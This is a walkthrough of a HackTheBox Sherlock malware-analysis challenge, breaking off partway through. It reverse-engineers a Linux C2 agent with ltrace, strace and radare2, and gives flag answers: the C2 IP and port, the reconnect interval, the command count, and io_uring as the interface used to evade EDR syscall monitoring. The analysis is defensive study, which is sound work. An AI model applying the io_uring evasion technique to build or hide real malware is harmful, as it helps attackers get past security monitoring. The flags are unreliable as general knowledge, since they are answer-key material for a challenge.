---
title: 'HackTheBox: PhantomRing Sherlock Walkthrough'
author: 0xcrax
categories: [HackTheBox]

tags: [radare2, r2, Reverse-Engineering, Malware, C2, io_uring, EDR-evasion, eBPF, forensics, ELF, Static-Analysis, Dynamic-Analysis, ltrace, strace, ftrace, suid, procfs, Kernel-Interface]
render_with_liquid: true
img_path: /images/HackTheBox/Sherlocks/PhantomRing
image:
  path: /images/HackTheBox/Sherlocks/PhantomRing/room_image.webp
---

<a href="https://app.hackthebox.com/sherlocks/PhantomRing" target="_blank" class="box-button" data-mobile-text="PhantomRing Sherlock | HackTheBox" style="display: flex; width: 100%; max-width: 1000px; align-items: center; justify-content: center; background: linear-gradient(135deg, #2a0e0e 0%, #1a0505 100%); padding: 15px 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3); color: #ff4444; text-decoration: none; font-family: Arial, sans-serif; font-weight: bold; border: 1px solid #ff5555; margin: 10px auto; transition: all 0.3s ease;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 0 25px rgba(255, 0, 0, 0.7)'; this.style.color='#ffffff';" onmouseout="this.style.transform='translateY(0px)'; this.style.boxShadow='0 4px 15px rgba(255, 0, 0, 0.3)'; this.style.color='#ff4444';">
<span>PhantomRing Sherlock | HackTheBox</span>
<img src="/images/HackTheBox/HTB.webp" alt="Icon" style="width: 48px; height: 48px; margin-right: 10px; filter: hue-rotate(300deg) brightness(0.9); transition: all 0.3s ease;" onmouseover="this.style.transform='scale(1.1)'; this.style.filter='hue-rotate(320deg) brightness(1.3)';" onmouseout="this.style.transform='scale(1)'; this.style.filter='hue-rotate(300deg) brightness(0.9)';">
</a>

---

## Comprehensive Overview

We start by downloading the challenge files from the HackTheBox CDN. The challenge provides a ZIP archive containing the malicious binary we need to reverse-engineer. We create a dedicated working directory to keep everything organized and use `wget` with the authenticated CDN redirect URL to pull the archive.

```console
mkdir -p ~/Desktop/HTB/Sherlocks/PhantomRing && cd ~/Desktop/HTB/Sherlocks/PhantomRing
```

```console
wget 'https://labs.hackthebox.com/api/v4/challenges/1296/cdn/redirect?auth_user_id=1644089&expires=1786111599&signature=98ffd0fd2f439a0984ed250844791ee84c0abff606fa21a7560e95760968bc55' -O PhantomRing.zip
```
{: .wrap }

```console
unzip PhantomRing.zip && ls
```
{: .wrap }

After extraction we see two items: the original ZIP archive and a directory called `phantom_ring`. Inside that directory lives a single file — the malware binary we're here to tear apart.

```console
cd phantom_ring && ls
```
{: .wrap }

```
agent
```
{: file="Directory listing of phantom_ring/" }

---

### File Type Identification

Before diving into any reverse engineering, the very first thing we do is identify what kind of file we're dealing with. The `file` command gives us the ELF metadata — architecture, bitness, linking type, and whether debug symbols have been stripped. This single command sets the stage for every tool we'll choose next.

```console
file agent
```
{: .wrap }

```
agent: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1f617f2ea259a7ec724d7bbc01627982dc2f0495, for GNU/Linux 3.2.0, not stripped
```
{: file="file output for agent binary" }

Let's break down what this tells us:

| Attribute | Value | What It Means |
| :--- | :--- | :--- |
| Class | ELF 64-bit LSB | 64-bit x86_64 binary, Little Endian byte order |
| Type | PIE executable | Position Independent Executable — ASLR will randomize its base address |
| Machine | x86-64 | Compiled for AMD64 / Intel 64 architecture |
| Linking | Dynamically linked | Depends on shared libraries at runtime (not statically compiled) |
| Interpreter | /lib64/ld-linux-x86-64.so.2 | Standard 64-bit Linux dynamic linker |
| Stripped | **Not stripped** | Debug symbols and function names are still present — huge advantage for us |

> The binary is **not stripped**, meaning all symbol names (function names like `main`, `cmd_users`, etc.) are preserved in the ELF symbol table. This makes static analysis significantly easier because radare2 and other tools can resolve human-readable names instead of forcing us to work with raw memory addresses.
{: .prompt-tip }

---

### Linked Library Reconnaissance

The `ldd` command reveals which shared libraries the binary depends on at runtime. For malware analysis this is critical — the library list tells us what capabilities the binary has without reading a single line of assembly. Networking libraries suggest C2 communication, crypto libraries suggest encrypted channels, and unusual libraries are always worth investigating.

```console
ldd agent
```
{: .wrap }

```
        linux-vdso.so.1 (0x00007fb441e5e000)
        liburing.so.2 => /usr/lib/x86_64-linux-gnu/liburing.so.2 (0x00007fb441e21000)
        libc.so.6 => /usr/lib/x86_64-linux-gnu/libc.so.6 (0x00007fb441c2b000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fb441e60000)
```
{: file="ldd output showing linked libraries" }

| Library | Purpose | Malware Relevance |
| :--- | :--- | :--- |
| `linux-vdso.so.1` | Kernel-provided virtual DSO for fast syscalls (gettimeofday, etc.) | Normal, not suspicious |
| **`liburing.so.2`** | **Linux io_uring async I/O library** | **⚠️ Key indicator — this is the evasion mechanism** |
| `libc.so.6` | Standard C library (printf, malloc, socket, etc.) | Expected dependency |
| `ld-linux-x86-64.so.2` | Dynamic linker/loader | Expected dependency |

> The presence of **`liburing.so.2`** is the critical finding here. Standard malware uses plain POSIX syscalls (`connect()`, `read()`, `write()`) which EDR agents hook via `ptrace`, `seccomp-bpf`, or kernel tracepoints. The io_uring interface operates through shared memory rings and a single `io_uring_enter()` syscall, bypassing most EDR syscall monitoring entirely. This is a modern evasion technique increasingly seen in advanced Linux malware.
{: .prompt-danger }

---

### Dynamic Analysis — ltrace

`ltrace` intercepts and records all library function calls made by the binary. This gives us a high-level view of what the malware does when it runs — without needing to read assembly. We can see the sequence of API calls, the arguments passed, and the return values.

```console
ltrace ./agent
```
{: .wrap }

```
io_uring_queue_init(16, 0x7ffd3098c7d0, 0, 0x55d415d5cc80)       = 0
memset(0x7ffd3098c7c0, '\0', 16)                                 = 0x7ffd3098c7c0
htons(4445)                                                      = 0x5d11
inet_pton(2, 0x55d415d5b51b, 0x7ffd3098c7c4, 0xffff)             = 1
socket(2, 1, 0)                                                  = 4
io_uring_get_sqe(0x7ffd3098c7d0, 1, 0, 0x7fcbcd942957)           = 0x7fcbcda4e000
io_uring_submit(0x7ffd3098c7d0, 0x7fcbcda4e000, 0, 0x7ffd3098c7c0) = 1
__io_uring_get_cqe(0x7ffd3098c7d0, 0x7ffd3098c7a8, 0, 1
```
{: file="ltrace output showing library calls" }

Let's decode the entire call sequence line by line:

| Call | Arguments | Return | Interpretation |
| :--- | :--- | :--- | :--- |
| `io_uring_queue_init(16, ...)` | Queue depth = 16 entries | `0` (success) | Initializes an io_uring instance with a submission queue of 16 entries |
| `memset(..., '\0', 16)` | Zeros 16 bytes of the sockaddr struct | Pointer to buffer | Clears the `sockaddr_in` structure before populating it |
| `htons(4445)` | Port 4445 in host byte order | `0x5d11` (network byte order) | Converts the C2 port to big-endian network byte order |
| `inet_pton(2, "192.168.56.1", ...)` | AF_INET, IP string, destination buffer | `1` (success) | Parses the hardcoded C2 IP address into binary form |
| `socket(2, 1, 0)` | AF_INET=2, SOCK_STREAM=1, IPPROTO_IP=0 | `4` (file descriptor) | Creates a TCP socket — the C2 communication channel |
| `io_uring_get_sqe(...)` | Ring pointer | SQE pointer | Gets a Submission Queue Entry to enqueue the connect operation |
| `io_uring_submit(...)` | Ring pointer | `1` (1 entry submitted) | Submits the queued connect operation to the kernel |
| `__io_uring_get_cqe(...)` | Ring pointer | — | Waits for the Completion Queue Entry (connect result) |

From just this ltrace output we can already answer several tasks: the C2 IP (`192.168.56.1`), the C2 port (`4445`), and the fact that io_uring is the primary I/O mechanism.

---

### Dynamic Analysis — strace

`strace` captures all **system calls** made by the process — one level deeper than `ltrace`. While ltrace shows library calls, strace shows the actual kernel syscalls. For io_uring-based malware this is especially revealing because we can see the raw `io_uring_setup` syscall and its configuration flags.

```console
strace -f ./agent
```
{: .wrap }

```
execve("./agent", ["./agent"], 0x7fff59758a88 /* 81 vars */) = 0
brk(NULL)                               = 0x55f5d67ce000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f384e82d000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=145763, ...}) = 0
mmap(NULL, 145763, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f384e809000
close(3)                                = 0
openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/liburing.so.2", O_RDONLY|O_CLOEXEC) = 3
```
{: file="strace initial output showing ELF loading" }

The first section of strace output shows the standard ELF loading sequence: `brk` to initialize the heap, `mmap` for anonymous memory, `access` to check for LD_PRELOAD hijacking, and then the dynamic linker loading `liburing.so.2` and `libc.so.6` from the cache.

The critical syscall comes next:

```console
strace -f ./agent 2>&1 | rg 'io_uring_setup'
```
{: .wrap }

```
io_uring_setup(16, {flags=IORING_SETUP_NO_SQARRAY, sq_thread_cpu=0, sq_thread_idle=0, sq_entries=16, cq_entries=32, features=IORING_FEAT_SINGLE_MMAP|IORING_FEAT_NODROP|IORING_FEAT_SUBMIT_STABLE|IORING_FEAT_RW_CUR_POS|IORING_FEAT_CUR_PERSONALITY|IORING_FEAT_FAST_POLL|IORING_FEAT_POLL_32BITS|IORING_FEAT_SQPOLL_NONFIXED|IORING_FEAT_EXT_ARG|IORING_FEAT_NATIVE_WORKERS|IORING_FEAT_RSRC_TAGS|IORING_FEAT_CQE_SKIP|IORING_FEAT_LINKED_FILE|IORING_FEAT_REG_REG_RING|IORING_FEAT_RECVSEND_BUNDLE|IORING_FEAT_MIN_TIMEOUT|IORING_FEAT_RW_ATTR|IORING_FEAT_NO_IOWAIT, ...}) = 3
```
{: file="strace io_uring_setup syscall" }

| Flag | Meaning | Evasion Relevance |
| :--- | :--- | :--- |
| `IORING_SETUP_NO_SQARRAY` | Uses a single mmap for both SQ and CQ rings | Reduces memory footprint, harder to detect |
| `IORING_FEAT_FAST_POLL` | Optimized poll operations | Efficient network polling without blocking |
| `IORING_FEAT_EXT_ARG` | Extended io_uring arguments | Access to newer operations |
| `IORING_FEAT_NATIVE_WORKERS` | Kernel worker threads | Async operations without userspace threading |

After io_uring is initialized, the strace continues with the socket creation and connection:

```
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 4
io_uring_enter(3, 1, 0, 0, NULL, 8)     = 1
io_uring_enter(3, 0, 1, IORING_ENTER_GETEVENTS, NULL, 8)
```
{: file="strace socket and io_uring_enter calls" }

Notice how the `connect()` syscall never appears in the strace output. Instead, we see `io_uring_enter()` — the single syscall that submits all queued I/O operations. The actual `connect` happens inside the kernel via the io_uring submission queue, completely invisible to traditional syscall hooking.

---

## Task 1 — SHA256 Hash of the Malicious Binary

Computing the cryptographic hash of the binary is standard first-step hygiene in malware analysis. This hash serves as a unique fingerprint that can be cross-referenced against threat intelligence feeds, VirusTotal, and malware databases. It's also required as the first answer in this challenge.

```console
sha256sum agent
```
{: .wrap }

```
2d7b1b2178f76c26893b2a56cbf9b36700235259e76b893d53817d5b66b634a5  agent
```
{: file="SHA256 hash of agent binary" }

> **Flag 1:** `2d7b1b2178f76c26893b2a56cbf9b36700235259e76b893d53817d5b66b634a5`
{: .prompt-danger }

---

## Static Analysis — Loading into radare2

For deep static analysis we load the binary into radare2 with full analysis. The `-A` flag runs the auto-analysis pipeline which identifies functions, resolves references, and recovers type information. Since the binary is not stripped, radare2 can resolve all symbol names automatically.

```console
r2 -A ./agent
```
{: .wrap }

```
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
```
{: file="radare2 auto-analysis output" }

> The warning about relocs is non-critical. For production analysis you'd add `-e bin.relocs.apply=true` but for this challenge it doesn't affect our results.
{: .prompt-info }

---

## Hunting for Functions — `afl`

The `afl` command (analyze function list) displays all functions radare2 has identified. This is where the "not stripped" property pays off massively — every function has a human-readable name that reveals its purpose immediately.

```console
[0x00001520]> afl
```
{: .wrap }

```
0x000012b0    1     11 sym.imp.__errno_location
0x000012c0    1     11 sym.imp.strncmp
0x000012d0    1     11 sym.imp._exit
0x000012e0    1     11 sym.imp.puts
0x000012f0    1     11 sym.imp.readlink
0x00001300    1     11 sym.imp.getpid
0x00001310    1     11 sym.imp.opendir
0x00001320    1     11 sym.imp.strlen
0x00001330    1     11 sym.imp.__stack_chk_fail
0x00001340    1     11 sym.imp.io_uring_submit
0x00001350    1     11 sym.imp.htons
0x00001360    1     11 sym.imp.printf
0x00001370    1     11 sym.imp.snprintf
0x00001380    1     11 sym.imp.memset
0x00001390    1     11 sym.imp.close
0x000013a0    1     11 sym.imp.closedir
0x000013b0    1     11 sym.imp.strcspn
0x000013c0    1     11 sym.imp.io_uring_queue_exit
0x000013d0    1     11 sym.imp.strcmp
0x000013e0    1     11 sym.imp.fprintf
0x000013f0    1     11 sym.imp.strtol
0x00001400    1     11 sym.imp.inet_pton
0x00001410    1     11 sym.imp.kill
0x00001420    1     11 sym.imp.io_uring_queue_init
0x00001430    1     11 sym.imp.readdir
0x00001440    1     11 sym.imp.__isoc99_sscanf
0x00001450    1     11 sym.imp.ttyname
0x00001460    1     11 sym.imp.__io_uring_get_cqe
0x00001470    1     11 sym.imp.io_uring_get_sqe
0x00001480    1     11 sym.imp.perror
0x00001490    1     11 sym.imp.strtok
0x000014a0    1     11 sym.imp.atoi
0x000014b0    1     11 sym.imp.exit
0x000014c0    1     11 sym.imp.fwrite
0x000014d0    1     11 sym.imp.strerror
0x000014e0    1     11 sym.imp.sleep
0x000014f0    1     11 sym.imp.strstr
0x00001500    1     11 sym.imp.__ctype_b_loc
0x00001510    1     11 sym.imp.socket
0x00001520    1     37 entry0
0x00001550    4     34 sym.deregister_tm_clones
0x00001580    4     51 sym.register_tm_clones
0x000015c0    5     54 entry.fini0
0x000012a0    1     11 fcn.000012a0
0x00001600    1      9 entry.init0
0x00001609    5    108 sym.io_uring_cq_advance
0x00001675    3     43 sym.io_uring_cqe_seen
0x000016a0    1    184 sym.io_uring_prep_rw
0x00001758    1     61 sym.io_uring_prep_connect
0x00001795    1     75 sym.io_uring_prep_openat
0x000017e0    1     55 sym.io_uring_prep_close
0x00001817    1     66 sym.io_uring_prep_read
0x00001859    1     66 sym.io_uring_prep_write
0x0000189b    1     80 sym.io_uring_prep_statx
0x000018eb    1     79 sym.io_uring_prep_send
0x0000193a    1     79 sym.io_uring_prep_recv
0x00001989    1     71 sym.io_uring_prep_unlinkat
0x000019d0    1     53 sym.io_uring_wait_cqe
0x000019d0    1     53 sym.io_uring_wait_cqe_nr
0x00002635   17    891 sym.cmd_recv
0x00001de9    5     96 sym.trim_leading
0x00001e49   15    602 sym.cmd_users
0x00001b20    3    176 sym.recv_all
0x000036ea    1    184 sym.cmd_exit
0x00001a2f    9    241 sym.send_all
0x000037a2   40   1762 sym.cmd_killbpf
0x000032d8   16    622 sym.cmd_privesc
0x000023da   14    603 sym.cmd_get
0x00002cfc   42   1500 sym.cmd_kick
0x00003546    5    420 sym.cmd_selfdestruct
0x00003e84   27    735 sym.process_cmd
0x000020a3   14    823 sym.cmd_ss
0x00001d68    7    129 sym.sanitize_cmd
0x00001bd0   11    408 sym.read_file_uring
0x00004167   21   1098 main
0x000029b0    5    214 sym.cmd_me
0x00002a86   19    630 sym.cmd_ps
0x00001000    3     27 sym._init
```
{: file="Full function list from radare2" }

### Identifying the C2 Command Functions

The author conveniently prefixed all command-handling functions with `cmd_`. Scanning the function list we can immediately map out the entire C2 command repertoire:

| Function Address | Function Name | Size (bytes) | Probable Purpose |
| :--- | :--- | :--- | :--- |
| `0x00002635` | `sym.cmd_recv` | 891 | Receive/exfiltrate file from agent |
| `0x00001e49` | `sym.cmd_users` | 602 | Enumerate logged-in users |
| `0x000036ea` | `sym.cmd_exit` | 184 | Terminate agent connection |
| `0x000037a2` | `sym.cmd_killbpf` | 1762 | Kill EDR tools using eBPF |
| `0x000032d8` | `sym.cmd_privesc` | 622 | Find SUID binaries for privilege escalation |
| `0x000023da` | `sym.cmd_get` | 603 | Read/exfiltrate a file |
| `0x00002cfc` | `sym.cmd_kick` | 1500 | Kill a user/session by terminal |
| `0x00003546` | `sym.cmd_selfdestruct` | 420 | Delete the agent binary |
| `0x000020a3` | `sym.cmd_ss` | 823 | Network connections (netstat equivalent) |
| `0x000029b0` | `sym.cmd_me` | 214 | Agent info (PID, TTY) |
| `0x00002a86` | `sym.cmd_ps` | 630 | Process listing |

### Utility Functions

| Function Address | Function Name | Purpose |
| :--- | :--- | :--- |
| `0x00003e84` | `sym.process_cmd` | Command dispatcher — parses C2 input and routes to the correct `cmd_` function |
| `0x00001d68` | `sym.sanitize_cmd` | Input sanitization — likely strips newlines and dangerous characters |
| `0x00001de9` | `sym.trim_leading` | Trims leading whitespace from strings |
| `0x00001b20` | `sym.recv_all` | Receives all data over the io_uring socket |
| `0x00001a2f` | `sym.send_all` | Sends all data over the io_uring socket |
| `0x00001bd0` | `sym.read_file_uring` | Reads a file using io_uring async I/O |

---

## Task 5 — Number of Supported C2 Commands

Simply counting the `sym.cmd_*` functions from the `afl` output gives us the answer. Each one represents a distinct command the C2 operator can send to the agent.

```console
[0x00001520]> afl ~ cmd_
```
{: .wrap }

```
0x00002635   17    891 sym.cmd_recv
0x00001e49   15    602 sym.cmd_users
0x000036ea    1    184 sym.cmd_exit
0x000037a2   40   1762 sym.cmd_killbpf
0x000032d8   16    622 sym.cmd_privesc
0x000023da   14    603 sym.cmd_get
0x00002cfc   42   1500 sym.cmd_kick
0x00003546    5    420 sym.cmd_selfdestruct
0x000020a3   14    823 sym.cmd_ss
0x000029b0    5    214 sym.cmd_me
0x00002a86   19    630 sym.cmd_ps
```
{: file="Filtered function list showing only cmd_ functions" }

Counting them: `cmd_recv`, `cmd_users`, `cmd_exit`, `cmd_killbpf`, `cmd_privesc`, `cmd_get`, `cmd_kick`, `cmd_selfdestruct`, `cmd_ss`, `cmd_me`, `cmd_ps` — that's **11** distinct command handlers.

> **Flag 5:** `11`
{: .prompt-danger }

---

## Disassembling `main` — The C2 Connection Loop

We seek directly to the `main` function and dump its full disassembly. This is the heart of the malware — it contains the initialization, connection logic, command receive loop, and cleanup routines. Understanding `main` gives us the complete operational flow.

```console
[0x00001520]> s main
[0x00004167]> pdf
```
{: .wrap }

### Stack Canaries & io_uring Initialization

The function begins with standard prologue and stack canary setup:

```asm
0x00004167      endbr64
0x0000416b      push rbp
0x0000416c      mov rbp, rsp
0x0000416f      lea r11, [rsp - 0x10000]
0x00004177      sub rsp, sym._init          ; 0x1000
0x0000417e      or qword [rsp], 0
0x00004183      cmp rsp, r11
0x00004186      jne 0x4177
0x00004188      sub rsp, 0x120
0x0000418f      mov rax, qword fs:[0x28]    ; Stack canary
0x00004198      mov qword [canary], rax
0x0000419c      xor eax, eax
```

The `mov rax, qword fs:[0x28]` at `0x0000418f` loads the stack canary from the TLS (Thread Local Storage). This is the standard GCC stack protector mechanism — if a buffer overflow corrupts the canary value, the `__stack_chk_fail` check at the end of `main` (visible at `0x000045a8`) will abort the process.

Then io_uring is initialized with a queue depth of 16:

```asm
0x0000419e      mov dword [rbp - 0x10120], 0xffffffff   ; socket_fd = -1
0x000041a8      lea rax, [rbp - 0x100f0]                  ; &ring (io_uring struct)
0x000041af      mov edx, 0                                 ; flags = 0
0x000041b4      mov rsi, rax                               ; &ring
0x000041b7      mov edi, 0x10                              ; entries = 16
0x000041bc      call sym.imp.io_uring_queue_init
0x000041c1      test eax, eax
0x000041c3      jns 0x41de                                  ; Jump if success (no sign flag)
```

If `io_uring_queue_init` fails, the error path prints the error via `perror("io_uring_queue_init")` and calls `exit(1)`.

### Socket Address Construction

On success, the code zeroes out a 16-byte `sockaddr_in` structure and begins populating it:

```asm
0x000041de      lea rax, [rbp - 0x10100]     ; &addr (sockaddr_in struct)
0x000041e5      mov edx, 0x10               ; 16 bytes
0x000041ea      mov esi, 0                  ; fill byte = 0
0x000041ef      mov rdi, rax                ; destination
0x000041f2      call sym.imp.memset         ; memset(&addr, 0, 16)

0x000041f7      mov word [rbp - 0x10100], 2  ; addr.sin_family = AF_INET (2)
```

---

## Task 3 — C2 Port

Immediately after setting the address family to `AF_INET`, the malware loads the port number and converts it to network byte order:

```asm
0x00004200      mov edi, 0x115d             ; Port value in hex
0x00004205      call sym.imp.htons           ; Convert to network byte order
0x0000420a      mov word [rbp - 0x100fe], ax  ; Store in addr.sin_port
```

The hex value `0x115d` is loaded into `edi` right before the `htons()` call. Converting `0x115d` from hexadecimal to decimal:

0x115d = (1 × 16<sup>3</sup>) + (1 × 16<sup>2</sup>) + (5 × 16<sup>1</sup>) + (13 × 16<sup>0</sup>) = **4445**

This is confirmed by our earlier `ltrace` output which showed `htons(4445) = 0x5d11`.

> **Flag 3:** `4445`
{: .prompt-danger }

---

## Task 2 — Hardcoded C2 IP Address

Right after the port, the IP address string is loaded and parsed:

```asm
0x0000421c      mov rdx, rax                      ; Destination buffer (addr.sin_addr)
0x0000421f      lea rax, str.192.168.56.1         ; Load IP string
0x00004226      mov rsi, rax                      ; Source string
0x00004229      mov edi, 2                        ; AF_INET
0x0000422e      call sym.imp.inet_pton            ; Parse IP address
```

At address `0x0000421f`, the `lea` (Load Effective Address) instruction loads the address of the string literal `"192.168.56.1"` from the `.rodata` section. This string is then passed to `inet_pton()` along with `AF_INET` (value 2) to convert it into a binary 32-bit IP address stored in the `sockaddr_in` structure.

> **Flag 2:** `192.168.56.1`
{: .prompt-danger }

> The IP `192.168.56.1` is the default host-only adapter address in VirtualBox. This tells us the malware was likely developed and tested in a VM environment where the attacker runs a C2 server on the host machine, reachable via the host-only network interface. In a real engagement, this would be replaced with the actual C2 server IP.
{: .prompt-tip }

---

## The Connection Loop — Socket Creation via io_uring

After populating the `sockaddr_in` structure, the malware enters a loop that creates a socket and attempts to connect to the C2 server. The connection itself is performed through io_uring rather than a direct `connect()` syscall:

```asm
; --- Socket Creation (jumped to on reconnect) ---
0x00004233      mov edx, 0                  ; protocol = 0 (IPPROTO_IP)
0x00004238      mov esi, 1                  ; type = SOCK_STREAM (TCP)
0x0000423d      mov edi, 2                  ; domain = AF_INET
0x00004242      call sym.imp.socket         ; socket(AF_INET, SOCK_STREAM, 0)
0x00004247      mov dword [rbp - 0x10120], eax  ; socket_fd = return value
0x0000424d      cmp dword [rbp - 0x10120], 0
0x00004254      jns 0x427e                   ; Jump if socket_fd >= 0 (success)
```

On socket creation failure, the error handler cleans up and exits. On success, the code prepares an io_uring connect operation:

```asm
; --- Queue io_uring connect ---
0x0000427e      lea rax, [rbp - 0x100f0]       ; &ring
0x00004285      mov rdi, rax                   ; ring
0x00004288      call sym.imp.io_uring_get_sqe  ; Get Submission Queue Entry
0x0000428d      mov qword [rbp - 0x10110], rax  ; sqe = returned SQE pointer

0x00004294      lea rdx, [rbp - 0x10100]      ; &addr (sockaddr_in)
0x0000429b      mov esi, dword [rbp - 0x10120] ; socket_fd
0x000042a1      mov rax, qword [rbp - 0x10110] ; sqe
0x000042a8      mov ecx, 0x10                 ; addrlen = 16
0x000042ad      mov rdi, rax                   ; sqe
0x000042b0      call sym.io_uring_prep_connect ; Prep connect SQE

0x000042b5      lea rax, [rbp - 0x100f0]
0x000042bc      mov rdi, rax
0x000042bf      call sym.imp.io_uring_submit  ; Submit to kernel
```

Then it waits for the connection result:

```asm
0x000042c4      lea rdx, [rbp - 0x10118]      ; &cqe_ptr
0x000042cb      lea rax, [rbp - 0x100f0]
0x000042d2      mov rsi, rdx
0x000042d5      mov rdi, rax
0x000042d8      call sym.io_uring_wait_cqe   ; Wait for completion
0x000042dd      mov dword [rbp - 0x1011c], eax  ; ret = wait result
```

---

## Task 4 — Reconnect Wait Time

The critical evasion behavior is in the reconnection logic. When the C2 connection fails, the malware doesn't just crash — it writes an error message, closes the socket, sleeps, and then **jumps back to socket creation** to retry the connection indefinitely:

```asm
; --- Connection Failed Path ---
0x0000439e      mov rax, qword [obj.stderr]      ; stderr
0x000043a5      mov rcx, rax
0x000043a8      mov edx, 0x26                   ; 38 bytes
0x000043ad      mov esi, 1                     ; size = 1
0x000043b2      lea rax, str.connect___failed:_trying_to_reconnect_n
                                            ; "connect() failed: trying to reconnect\n"
0x000043b9      mov rdi, rax
0x000043bc      call sym.imp.fwrite            ; fwrite(error_msg, 1, 38, stderr)

0x000043c1      ; ... io_uring_cqe_seen ...
0x000043da      mov eax, dword [rbp - 0x10120] ; socket_fd
0x000043e0      mov edi, eax
0x000043e2      call sym.imp.close             ; close(socket_fd)

0x000043e7      mov edi, 0x78                   ; sleep argument = 0x78
0x000043ec      call sym.imp.sleep              ; sleep(0x78)

; --- Jump back to socket creation ---
0x000043f1      jmp 0x4233                       ; Retry loop
```

At address `0x000043e7`, the value `0x78` is moved into `edi` right before calling `sleep()`. Converting this hex value to decimal:


{% assign step1 = 7 | times: 16 %}
{% assign total = step1 | plus: 8 %}

0x78 = (7 &times; 16) + 8 = {{ step1 }} + 8 = **{{ total }}**


So the malware waits **120 seconds** (2 minutes) between reconnection attempts. This is a deliberate operational security choice — a shorter interval would create noisy repeated connection attempts that network monitoring tools could detect as a beaconing pattern, while a longer interval would make the malware unresponsive.

> **Flag 4:** `120`
{: .prompt-danger }

### Connection Success Path

When the connect succeeds (CQE result is 0), the malware prints the success message and falls through to the command receive loop:

```asm
; --- Connection Success ---
0x00004373      call sym.io_uring_cqe_seen     ; Mark CQE as processed
0x00004379      mov edx, 0x115d                  ; Port (4445) for printf
0x0000437e      lea rax, str.192.168.56.1
0x00004385      mov rsi, rax
0x00004388      lea rax, str.___Connected_to__s:_d_n
                                            ; "[+] Connected to %s:%d\n"
0x0000438f      mov rdi, rax
0x00004392      xor eax, eax
0x00004397      call sym.imp.printf
```

---

## Task 6 — Linux Kernel Interface Abused for EDR Evasion

Both our `ltrace` and `strace` outputs have made this abundantly clear by now, but let's formalize the answer with the technical reasoning.

The malware exclusively uses **io_uring** (specifically `liburing.so.2`) for all I/O operations: socket creation (`io_uring_prep_connect`), file reading (`io_uring_prep_read`), file writing (`io_uring_prep_write`), file opening (`io_uring_prep_openat`), file deletion (`io_uring_prep_unlinkat`), and network send/receive (`io_uring_prep_send`, `io_uring_prep_recv`).

```asm
; Evidence from main — every I/O op goes through io_uring
call sym.io_uring_prep_connect   ; Instead of connect()
call sym.imp.io_uring_submit     ; Single syscall to submit all ops
call sym.io_uring_wait_cqe      ; Wait for completion
call sym.io_uring_prep_recv     ; Instead of recv()
call sym.io_uring_prep_send     ; Instead of send()
call sym.io_uring_prep_close    ; Instead of close()
call sym.io_uring_prep_openat   ; Instead of openat()
call sym.io_uring_prep_unlinkat ; Instead of unlinkat()
```

| Traditional Syscall | io_uring Equivalent | EDR Bypass Reason |
| :--- | :--- | :--- |
| `connect()` | `io_uring_prep_connect` | Kernel-internal, no userspace hook point |
| `recv()` | `io_uring_prep_recv` | Data read from shared ring buffer, not syscall return |
| `send()` | `io_uring_prep_send` | Written to shared ring buffer by userspace |
| `openat()` | `io_uring_prep_openat` | File opened by kernel worker thread |
| `read()` | `io_uring_prep_read` | Async kernel read, no direct syscall |
| `unlinkat()` | `io_uring_prep_unlinkat` | File deletion by kernel, bypasses hooks |

> **Why this works:** Traditional EDR agents monitor syscalls via `ptrace` (PTRACE_SYSCALL), `seccomp-bpf` filters, or eBPF programs attached to tracepoints. All of these intercept at the **syscall boundary**. With io_uring, the application submits a **batch of operations** through shared memory rings and enters the kernel via a single `io_uring_enter()` syscall. The kernel then processes all queued operations internally. The EDR only sees one syscall (`io_uring_enter`) but the malware is actually performing connect, read, write, open, and unlink operations — all invisible to userspace monitoring.
{: .prompt-warning }


> **Flag 6:** `io_uring`
{: .prompt-danger }

---

## Task 7 — File Read for User Enumeration

To determine which file the agent reads to enumerate logged-in users, we seek to the `cmd_users` function and examine its disassembly.

> We can also use radare2's visual graph mode (`VV`) for a flowchart view, but the terminal disassembly works perfectly fine with `pdf`.
> Now we can press p to cycle the views if it looks weird, and use the Arrow Keys to scroll down the flowchart. Look for a string being loaded right before a file open operation (it will likely look like str._var_...).
> To exit back to the prompt, press q.
{: .prompt-info }

```console
[0x00004167]> s sym.cmd_users
[0x00001e49]> pdf
```
{: .wrap }

<img src="/images/HackTheBox/Sherlocks/PhantomRing/cmd_users_disasm.webp" alt="cmd_users function disassembly">

At the beginning of `sym.cmd_users`, the function loads a file path string and opens it for reading. Looking at the strings referenced in this function, we find the path to the utmp database — the standard Linux file that tracks logged-in users:

```asm
; Inside sym.cmd_users — file path loaded for open
text segment reference: str._var_run_utmp
```

The `/var/run/utmp` file (symlinked to `/run/utmp` on modern systems) is a binary database file that maintains a record of all currently logged-in users. Each entry in this file is a `struct utmp` containing the username, terminal line, host address, and login timestamp. The malware opens this file, iterates over its entries using `read()`, and formats the output to send back to the C2 operator.

This is confirmed in the string table at index 0:

```asm
0  0x00005008 0x00005008 13  14   .rodata ascii /var/run/utmp
```
{: file="String Dumping" }

> **Flag 7:** `/var/run/utmp`
{: .prompt-danger }

---

## Task 8 — Directory Scanned for SUID Binaries

The `cmd_privesc` function is responsible for identifying potential privilege escalation vectors on the compromised system. It scans a specific directory looking for files with the SUID (Set Owner User ID) bit set — these binaries execute with the file owner's permissions (often root) regardless of who runs them.

```console
